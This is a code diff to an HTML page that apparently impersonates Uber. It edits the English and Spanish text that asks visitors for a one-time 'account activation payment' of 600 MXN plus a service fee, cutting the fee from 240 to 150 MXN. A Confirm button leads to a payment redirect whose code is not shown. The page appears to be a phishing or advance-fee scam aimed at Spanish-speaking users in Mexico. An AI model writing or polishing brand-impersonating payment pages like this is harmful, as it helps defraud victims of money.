@@ -81,17 +81,17 @@
         <h1>Uber</h1>
     </div>
     <div class="content">
-        <h2 id="accountVerifiedTitle">Account Verified</h2>
+        <h2 id="accountVerifiedTitle">Account Activation Pending Payment</h2>
         <p class="confirmation-message" id="confirmationMessage">
-            Your account has been confirmed and is pending activation.
+            Your account has been reviewed and is ready to be activated.
         </p>
         <p class="instructions" id="instructionsMessage">
-            You are required to make a one-time activation payment of 750 MXN pesos before activation:
+            However, a payment is required to complete the activation process.
         </p>
         <div class="payment-details" id="paymentDetails">
             <p><strong>Breakdown:</strong></p>
             <p>Account Activation Payment: 600 MXN</p>
-            <p>Service Fee: 240 MXN</p>
+            <p>Service Fee: 150 MXN</p>
         </div>
         <button class="activation-button" onclick="redirectToPayment()">Confirm</button>
         <button class="activation-button" style="background-color: red;" onclick="cancelActivation()">Cancel</button>
@@ -109,9 +109,9 @@
 
         if (userLang.includes('es')) {
             // Spanish Translation
-            accountVerifiedTitle.textContent = "Cuenta Verificada";
-            confirmationMessage.textContent = "Tu cuenta ha sido confirmada y está pendiente de activación.";
-            instructionsMessage.textContent = "Debes realizar un pago único de activación de 750 MXN pesos antes de la activación:";
+            accountVerifiedTitle.textContent = "Pago Pendiente de Activación de Cuenta";
+            confirmationMessage.textContent = "Tu cuenta ha sido revisada y está lista para ser activada.";
+            instructionsMessage.textContent = "Sin embargo, se requiere un pago para completar el proceso de activación.";
             paymentDetails.innerHTML = `
                 <p><strong>Desglose:</strong></p>
                 <p>Pago de Activación de Cuenta: 600 MXN</p>
